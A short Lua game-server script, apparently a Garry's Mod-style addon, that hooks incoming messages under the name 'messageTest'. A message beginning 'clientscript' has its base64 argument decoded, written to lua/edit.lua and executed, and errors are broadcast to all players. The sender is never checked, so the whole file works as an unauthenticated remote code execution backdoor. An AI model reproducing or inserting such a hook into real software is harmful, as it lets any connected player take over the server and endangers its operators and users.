local function messageTest(str,cl)
	local script = ""
	local args = string.Explode(" ",str)
	if(args[1] == "clientscript") then
		script = base64.dec(args[2])
	end
	
	local file = io.open("lua/edit.lua","w")
	if(file != nil) then
		file:write(script)
		file:close()
	end
	
	local b,e = pcall(include,"lua/edit.lua")
	if(!b) then
		for k,v in pairs(GetAllPlayers()) do
			v:SendMessage("^1Script error: " .. e .. "\n")
		end
	end
end
hook.add("MessageReceived","recvscript",messageTest)